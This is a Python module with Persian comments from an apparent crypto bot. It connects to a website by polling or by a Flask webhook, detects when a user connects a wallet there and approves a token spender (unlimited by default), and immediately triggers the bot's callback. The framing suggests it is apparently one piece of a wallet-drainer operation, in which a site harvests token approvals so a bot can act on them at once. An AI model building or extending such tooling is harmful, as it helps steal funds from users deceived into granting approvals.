"""
Website Connector Module
========================
به جای مانیتور مستقیم بلاکچین، به سایت شما متصل می‌شه.

وقتی کاربر روی سایت کیف پولش رو وصل کرد و approve داد،
این ماژول فوری متوجه می‌شه و ربات رو فعال می‌کنه.

دو روش اتصال:
  1. Polling  — هر چند ثانیه یک‌بار از سایت می‌پرسه: «approval جدیدی هست؟»
  2. Webhook  — سایت approval رو فوری به ربات Push می‌کنه (سریع‌تر)
"""

import os
import json
import time
import logging
import threading
import hashlib
import hmac
from typing import Callable, Optional, Set
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None

try:
    from flask import Flask, request as flask_request, jsonify
except ImportError:
    Flask = None

from core.mempool_monitor import PendingApproval

logger = logging.getLogger("WebsiteConnector")

ETHEREUM_CHAIN_ID = 1


class WebsiteConnector:
    """
    ربات رو به سایت وصل می‌کنه.

    سایت باید یک endpoint داشته باشه که approval های جدید رو برگردونه:
      GET  {WEBSITE_URL}/api/approvals/pending
      POST {WEBSITE_URL}/api/approvals/confirm/<id>   (علامت‌زدن به‌عنوان پردازش‌شده)

    یا می‌تونه approval ها رو مستقیم به ربات Push کنه (Webhook):
      POST http://<bot-host>:{WEBHOOK_PORT}/webhook/approval
    """

    def __init__(
        self,
        on_approval_detected: Callable[[PendingApproval], None],
        website_url: Optional[str] = None,
        api_key: Optional[str] = None,
        poll_interval: float = 1.0,
        webhook_port: int = 8765,
        enable_webhook: bool = True,
        enable_polling: bool = True,
    ):
        self.on_approval_detected = on_approval_detected
        self.website_url = (website_url or os.getenv("WEBSITE_URL", "")).rstrip("/")
        self.api_key = api_key or os.getenv("WEBSITE_API_KEY", "")
        self.webhook_secret = os.getenv("WEBSITE_WEBHOOK_SECRET", "")
        self.poll_interval = float(os.getenv("WEBSITE_POLL_INTERVAL", str(poll_interval)))
        self.webhook_port = int(os.getenv("WEBHOOK_PORT", str(webhook_port)))
        self.enable_webhook = os.getenv("ENABLE_WEBHOOK", str(enable_webhook)).lower() == "true"
        self.enable_polling = os.getenv("ENABLE_POLLING", str(enable_polling)).lower() == "true"

        self._running = False
        self._seen_ids: Set[str] = set()
        self._lock = threading.Lock()
        self._poll_thread: Optional[threading.Thread] = None
        self._webhook_thread: Optional[threading.Thread] = None

        self._stats = {
            "approvals_received": 0,
            "polls_done": 0,
            "webhooks_received": 0,
            "errors": 0,
            "last_approval_at": None,
        }

        if not self.website_url:
            logger.warning("⚠️  WEBSITE_URL تنظیم نشده. WebsiteConnector غیرفعاله.")
        else:
            logger.info(f"🌐 WebsiteConnector آماده: {self.website_url}")

    # ─────────────────────────────────────────────────────── شروع/توقف ──

    def start(self):
        if not self.website_url and not self.enable_webhook:
            logger.warning("⚠️  هیچ منبعی فعال نیست. WebsiteConnector شروع نشد.")
            return

        self._running = True
        logger.info("🚀 WebsiteConnector شروع به کار کرد")

        if self.enable_polling and self.website_url:
            self._poll_thread = threading.Thread(
                target=self._polling_loop, daemon=True, name="WebsitePollThread"
            )
            self._poll_thread.start()
            logger.info(f"📡 Polling فعال — هر {self.poll_interval}s از {self.website_url} می‌پرسم")

        if self.enable_webhook:
            self._webhook_thread = threading.Thread(
                target=self._start_webhook_server, daemon=True, name="WebhookThread"
            )
            self._webhook_thread.start()
            logger.info(f"📬 Webhook فعال — گوش می‌دم روی پورت {self.webhook_port}")

    def stop(self):
        self._running = False
        logger.info("🛑 WebsiteConnector متوقف شد")

    # ──────────────────────────────────────────────────────── Polling ──

    def _polling_loop(self):
        """هر چند ثانیه یک‌بار از سایت می‌پرسه approval جدیدی هست؟"""
        consecutive_errors = 0

        while self._running:
            try:
                approvals = self._fetch_pending_approvals()
                self._stats["polls_done"] += 1

                for item in approvals:
                    self._process_approval_item(item, source="polling")

                consecutive_errors = 0

            except Exception as exc:
                consecutive_errors += 1
                self._stats["errors"] += 1
                wait = min(consecutive_errors * 2, 30)
                logger.error(f"❌ خطا در polling ({consecutive_errors}x): {exc} — {wait}s صبر می‌کنم")
                time.sleep(wait)
                continue

            time.sleep(self.poll_interval)

    def _fetch_pending_approvals(self) -> list:
        """GET /api/approvals/pending را صدا می‌زنه"""
        if requests is None:
            raise RuntimeError("کتابخانه 'requests' نصب نیست. pip install requests")

        url = f"{self.website_url}/api/approvals/pending"
        headers = self._build_headers()

        resp = requests.get(url, headers=headers, timeout=5)
        resp.raise_for_status()

        data = resp.json()

        if isinstance(data, list):
            return data
        if isinstance(data, dict):
            return data.get("approvals", data.get("data", data.get("results", [])))

        return []

    def _mark_approval_processed(self, approval_id: str):
        """به سایت می‌گه این approval پردازش شد"""
        if not requests or not approval_id:
            return
        try:
            url = f"{self.website_url}/api/approvals/confirm/{approval_id}"
            requests.post(url, headers=self._build_headers(), timeout=3)
        except Exception as exc:
            logger.debug(f"confirm فرستاده نشد ({approval_id}): {exc}")

    # ──────────────────────────────────────────────────────── Webhook ──

    def _start_webhook_server(self):
        """یک سرور Flask کوچیک راه می‌اندازه که approval ها رو دریافت می‌کنه"""
        if Flask is None:
            logger.error("❌ Flask نصب نیست. Webhook غیرفعال. pip install flask")
            return

        app = Flask("WebhookReceiver")
        log = logging.getLogger("werkzeug")
        log.setLevel(logging.ERROR)

        @app.route("/webhook/approval", methods=["POST"])
        def receive_approval():
            if self.webhook_secret:
                sig = flask_request.headers.get("X-Signature", "")
                body = flask_request.get_data()
                expected = hmac.new(
                    self.webhook_secret.encode(), body, digestmod=hashlib.sha256
                ).hexdigest()
                if not hmac.compare_digest(sig, f"sha256={expected}"):
                    return jsonify({"error": "Invalid signature"}), 401

            data = flask_request.get_json(force=True, silent=True)
            if not data:
                return jsonify({"error": "Invalid JSON"}), 400

            self._stats["webhooks_received"] += 1
            items = data if isinstance(data, list) else [data]

            for item in items:
                self._process_approval_item(item, source="webhook")

            return jsonify({"status": "ok", "processed": len(items)}), 200

        @app.route("/webhook/health", methods=["GET"])
        def webhook_health():
            return jsonify({"status": "running", "stats": self._stats}), 200

        logger.info(f"📬 Webhook server روی پورت {self.webhook_port} شروع کرد")
        app.run(host="0.0.0.0", port=self.webhook_port, debug=False, use_reloader=False)

    # ──────────────────────────────────────────────── پردازش approval ──

    def _process_approval_item(self, item: dict, source: str = "unknown"):
        """
        یک approval دریافتی از سایت رو به PendingApproval تبدیل می‌کنه
        و callback رو صدا می‌زنه.

        فرمت مورد انتظار از سایت:
        {
            "id":            "uuid یا هر شناسه یکتا",
            "wallet":        "0xADDRESS_کاربر",
            "token":         "0xTOKEN_ADDRESS",
            "spender":       "0xSPENDER_ADDRESS",
            "amount":        "115792..." یا عدد (برای unlimited),
            "tx_hash":       "0x..." (اختیاری),
            "chain_id":      1 (اختیاری)
        }
        """
        try:
            approval_id = str(item.get("id") or item.get("_id") or "")
            wallet = (
                item.get("wallet")
                or item.get("owner")
                or item.get("from")
                or item.get("user_address")
                or ""
            ).lower()
            token = (
                item.get("token")
                or item.get("token_address")
                or item.get("contract")
                or ""
            ).lower()
            spender = (
                item.get("spender")
                or item.get("spender_address")
                or ""
            ).lower()
            raw_amount = item.get("amount") or item.get("value") or 0
            tx_hash = (
                item.get("tx_hash")
                or item.get("txHash")
                or item.get("transaction_hash")
                or f"website_{approval_id or int(time.time())}"
            )

            if not wallet or not token or not spender:
                logger.warning(f"⚠️  approval ناقص (از {source}): {item}")
                return

            # ─── فیلتر شبکه: فقط Ethereum Mainnet (chain_id=1) ───
            chain_id = item.get("chain_id", ETHEREUM_CHAIN_ID)
            try:
                chain_id = int(chain_id)
            except (TypeError, ValueError):
                chain_id = ETHEREUM_CHAIN_ID

            if chain_id != ETHEREUM_CHAIN_ID:
                logger.warning(
                    f"⛔ [WebsiteConnector] approval از chain_id={chain_id} رد شد — "
                    f"فقط Ethereum Mainnet (chain_id=1) پشتیبانی می‌شود"
                )
                return

            # جلوگیری از پردازش تکراری
            unique_key = f"{wallet}:{token}:{spender}:{approval_id}"
            with self._lock:
                if unique_key in self._seen_ids:
                    return
                self._seen_ids.add(unique_key)

                # حداکثر ۵۰۰۰ رکورد در حافظه نگه می‌داریم
                # از oldest-first deque برای حذف صحیح استفاده می‌کنیم
                if not hasattr(self, '_seen_ids_order'):
                    self._seen_ids_order: list = []
                self._seen_ids_order.append(unique_key)

                if len(self._seen_ids) > 5000:
                    to_remove = self._seen_ids_order[:500]
                    self._seen_ids_order = self._seen_ids_order[500:]
                    for k in to_remove:
                        self._seen_ids.discard(k)

            try:
                amount_int = int(raw_amount)
            except (ValueError, TypeError):
                amount_int = 2**256 - 1

            pending = PendingApproval(
                tx_hash=tx_hash,
                from_address=wallet,
                token_address=token,
                spender=spender,
                amount=amount_int,
                gas_price=0,
            )

            self._stats["approvals_received"] += 1
            self._stats["last_approval_at"] = datetime.now().isoformat()

            logger.info(
                f"\n{'='*60}\n"
                f"🌐 APPROVAL از سایت (via {source})\n"
                f"   👤 کیف پول: {wallet}\n"
                f"   🪙 توکن:    {token}\n"
                f"   📤 Spender: {spender}\n"
                f"   💎 مقدار:   {'unlimited' if amount_int >= 2**250 else amount_int}\n"
                f"{'='*60}"
            )

            # اجرای callback اصلی ربات
            self.on_approval_detected(pending)

            # علامت‌زدن به‌عنوان پردازش‌شده (اختیاری)
            if approval_id and self.website_url and source == "polling":
                threading.Thread(
                    target=self._mark_approval_processed,
                    args=(approval_id,),
                    daemon=True,
                ).start()

        except Exception as exc:
            self._stats["errors"] += 1
            logger.error(f"❌ خطا در پردازش approval از {source}: {exc}")

    # ────────────────────────────────────────────────────── ابزارها ──

    def _build_headers(self) -> dict:
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        if self.api_key:
            headers["X-API-Key"] = self.api_key
            headers["Authorization"] = f"Bearer {self.api_key}"
        return headers

    def get_stats(self) -> dict:
        return {**self._stats, "seen_ids_count": len(self._seen_ids)}

    def inject_approval_manually(self, wallet: str, token: str, spender: str,
                                  amount: int = 2**256 - 1, tx_hash: str = "manual"):
        """برای تست: یک approval رو دستی تزریق کن"""
        item = {
            "id": f"manual_{int(time.time())}",
            "wallet": wallet,
            "token": token,
            "spender": spender,
            "amount": amount,
            "tx_hash": tx_hash,
        }
        self._process_approval_item(item, source="manual")
